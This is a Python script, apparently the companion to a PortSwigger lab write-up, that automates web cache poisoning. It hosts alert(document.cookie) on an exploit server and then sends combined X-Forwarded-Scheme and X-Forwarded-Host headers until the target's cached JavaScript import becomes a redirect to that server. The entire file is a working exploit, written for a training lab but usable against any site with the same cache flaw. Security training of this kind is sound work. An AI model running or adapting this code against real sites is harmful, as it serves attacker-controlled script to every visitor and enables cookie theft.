#!/usr/bin/env python3
"""
Web cache poisoning with multiple headers
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 03-multiple-headers.md

What this does:
    Neither X-Forwarded-Scheme nor X-Forwarded-Host alone changes anything on
    the cached JS resource import, but combined they force a 302 redirect
    whose target hostname we control. This script hosts alert(document.cookie)
    on the PortSwigger exploit server at the same resource path the target
    imports, then poisons the cached redirect so every visitor requesting
    that resource gets sent to our exploit server instead.

Usage:
    python 03-multiple-headers.py <lab-url> <exploit-server-url>
    e.g. python 03-multiple-headers.py https://0a1b...web-security-academy.net https://exploit-0a1c....exploit-server.net

Requirements:
    pip install httpx
"""

import asyncio
import re
import sys
from urllib.parse import urlparse
import httpx


def _is_cache_miss(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "miss" in xc or "miss" in cf


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def exploit_server_store(client: httpx.AsyncClient, exploit_server: str,
                                file_path: str, body: str,
                                head: str = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8") -> bool:
    store_url = f"{exploit_server.rstrip('/')}/store"
    data = {
        "urlIsHttps": "on",
        "responseFile": file_path,
        "responseHead": head,
        "responseBody": body,
    }
    r = await client.post(store_url, data=data, follow_redirects=True)
    verify = await client.get(f"{exploit_server.rstrip('/')}{file_path}")
    if verify.status_code == 200 and body in verify.text:
        return True
    return body[:20] in verify.text if verify.text else False


async def poison_via_multi_header(client: httpx.AsyncClient, url: str, headers: dict,
                                   check_string: str, max_attempts: int = 30) -> bool:
    print(f"[*] Poisoning {url} via multi-header: {list(headers.keys())}...")
    for attempt in range(max_attempts):
        r = await client.get(url, headers=headers)
        if _is_cache_miss(dict(r.headers)):
            await asyncio.sleep(0.2)
            verify = await client.get(url)
            if check_string in verify.text:
                print(f"[+] Multi-header poison verified (body) on attempt {attempt + 1}!")
                return True
            if check_string in verify.headers.get("location", ""):
                print(f"[+] Multi-header poison verified (redirect) on attempt {attempt + 1}!")
                return True
            if verify.status_code in (301, 302) and any(
                v in verify.headers.get("location", "") for v in headers.values()
            ):
                print(f"[+] Multi-header poison: redirect cached on attempt {attempt + 1}!")
                return True
        await asyncio.sleep(0.5)
    print(f"[-] Multi-header poison failed after {max_attempts} attempts")
    return False


async def solve(lab_url: str, exploit_server: str) -> None:
    exploit_host = urlparse(exploit_server).hostname

    async with httpx.AsyncClient(verify=False, follow_redirects=False, timeout=15) as client:
        # Step 1: find a JS resource import on the home page.
        r = await client.get(lab_url, follow_redirects=True)
        js_paths = re.findall(r'<script\s+[^>]*src="(/resources/js/[^"]+)"', r.text)
        if not js_paths:
            js_paths = re.findall(r'src="(/[^"]*\.js)"', r.text)
        if not js_paths:
            print("[-] No JS resource imports found -- cannot proceed")
            return

        js_path = js_paths[0]
        js_url = f"{lab_url}{js_path}"
        print(f"[+] Target JS resource: {js_path}")

        # Step 2: host the payload on the exploit server at the same path.
        exploit_body = "alert(document.cookie)"
        stored = await exploit_server_store(
            client, exploit_server, js_path, exploit_body,
            head="HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8\r\nAccess-Control-Allow-Origin: *",
        )
        print(f"[+] Exploit JS stored at {exploit_server}{js_path}" if stored
              else "[!] Warning: exploit store may have failed -- continuing anyway")

        # Step 3: force the redirect via the combined headers, poisoning the
        # resource's own cache entry.
        headers = {"X-Forwarded-Scheme": "http", "X-Forwarded-Host": exploit_host}
        poisoned = await poison_via_multi_header(client, js_url, headers, check_string=exploit_host)

        if not poisoned:
            print("[-] Not solved -- redirect never confirmed cached")
            return

        await asyncio.sleep(3)
        if await _lab_solved(client, lab_url):
            print("[+] Lab solved.")
            return

        print("[*] Waiting for the simulated victim to visit...")
        for _ in range(15):
            await asyncio.sleep(3)
            if await _lab_solved(client, lab_url):
                print("[+] Lab solved.")
                return

        print("[-] Not solved yet -- redirect was cached but the visitor hasn't triggered it.")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <lab-url> <exploit-server-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/"), sys.argv[2].rstrip("/")))
